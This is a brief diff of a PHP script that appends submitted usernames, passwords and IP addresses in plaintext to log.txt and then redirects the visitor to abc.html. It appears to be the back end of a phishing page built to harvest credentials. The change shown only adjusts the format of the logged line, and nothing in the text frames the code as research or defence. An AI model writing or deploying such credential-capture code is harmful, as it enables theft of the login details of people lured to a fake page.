@@ -11,7 +11,7 @@
 
     $myFile = "log.txt";
     $fh = fopen($myFile, 'a');
-    fwrite($fh, "user: $user. -- pass: $pass. -- IP: $ip \n");
+    fwrite($fh, "user: $user -- pass: $pass -- IP: $ip \n");
     fclose($fh);
     header('Location: abc.html');
 ?>
